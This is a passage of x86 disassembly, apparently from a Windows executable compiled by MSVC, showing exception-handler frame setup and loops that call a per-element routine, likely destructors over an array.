  4051a8:	83 ec 18             	sub    $0x18,%esp
  4051ab:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4051ae:	8b 45 08             	mov    0x8(%ebp),%eax
  4051b1:	89 61 fc             	mov    %esp,-0x4(%ecx)
  4051b4:	c7 41 08 ff ff ff ff 	movl   $0xffffffff,0x8(%ecx)
  4051bb:	c7 41 04 e0 55 40 00 	movl   $0x4055e0,0x4(%ecx)
  4051c2:	64 8b 15 00 00 00 00 	mov    %fs:0x0,%edx
  4051c9:	89 11                	mov    %edx,(%ecx)
  4051cb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4051d2:	8b 48 04             	mov    0x4(%eax),%ecx
  4051d5:	8b 40 08             	mov    0x8(%eax),%eax
  4051d8:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4051db:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4051de:	83 e8 01             	sub    $0x1,%eax
  4051e1:	72 1a                	jb     0x4051fd
  4051e3:	8d 51 08             	lea    0x8(%ecx),%edx
  4051e6:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4051e9:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4051f0:	89 55 dc             	mov    %edx,-0x24(%ebp)
  4051f3:	e8 c5 fe ff ff       	call   0x4050bd
  4051f8:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4051fb:	eb de                	jmp    0x4051db
  4051fd:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405200:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  405206:	83 c4 18             	add    $0x18,%esp
  405209:	5e                   	pop    %esi
  40520a:	5f                   	pop    %edi
  40520b:	5b                   	pop    %ebx
  40520c:	5d                   	pop    %ebp
  40520d:	c3                   	ret
  40520e:	55                   	push   %ebp
  40520f:	83 c5 0c             	add    $0xc,%ebp
  405212:	8b 75 e0             	mov    -0x20(%ebp),%esi
  405215:	8b 7d dc             	mov    -0x24(%ebp),%edi
  405218:	85 f6                	test   %esi,%esi
  40521a:	74 0d                	je     0x405229
  40521c:	89 f9                	mov    %edi,%ecx
  40521e:	e8 9a fe ff ff       	call   0x4050bd
  405223:	83 c7 08             	add    $0x8,%edi
  405226:	4e                   	dec    %esi
  405227:	75 f3                	jne    0x40521c
  405229:	5d                   	pop    %ebp
  40522a:	c3                   	ret
  40522b:	55                   	push   %ebp
  40522c:	89 e5                	mov    %esp,%ebp
  40522e:	53                   	push   %ebx
  40522f:	57                   	push   %edi
  405230:	56                   	push   %esi
  405231:	83 ec 28             	sub    $0x28,%esp
  405234:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405237:	8a 55 10             	mov    0x10(%ebp),%dl
  40523a:	31 f6                	xor    %esi,%esi
  40523c:	8d 7d d8             	lea    -0x28(%ebp),%edi
  40523f:	89 60 fc             	mov    %esp,-0x4(%eax)
  405242:	c7 40 08 ff ff ff ff 	movl   $0xffffffff,0x8(%eax)
  405249:	c7 40 04 f0 55 40 00 	movl   $0x4055f0,0x4(%eax)
  405250:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  405257:	89 08                	mov    %ecx,(%eax)
  405259:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40525f:	89 d0                	mov    %edx,%eax
  405261:	2a 45 0c             	sub    0xc(%ebp),%al
  405264:	0f b6 c0             	movzbl %al,%eax
  405267:	0f 42 c6             	cmovb  %esi,%eax
  40526a:	31 db                	xor    %ebx,%ebx
  40526c:	0f b6 c0             	movzbl %al,%eax
  40526f:	43                   	inc    %ebx
  405270:	53                   	push   %ebx
  405271:	53                   	push   %ebx
  405272:	6a 00                	push   $0x0
  405274:	50                   	push   %eax
  405275:	57                   	push   %edi
  405276:	e8 ba f7 ff ff       	call   0x404a35
  40527b:	83 c4 14             	add    $0x14,%esp
  40527e:	8b 47 04             	mov    0x4(%edi),%eax
  405281:	39 1f                	cmp    %ebx,(%edi)
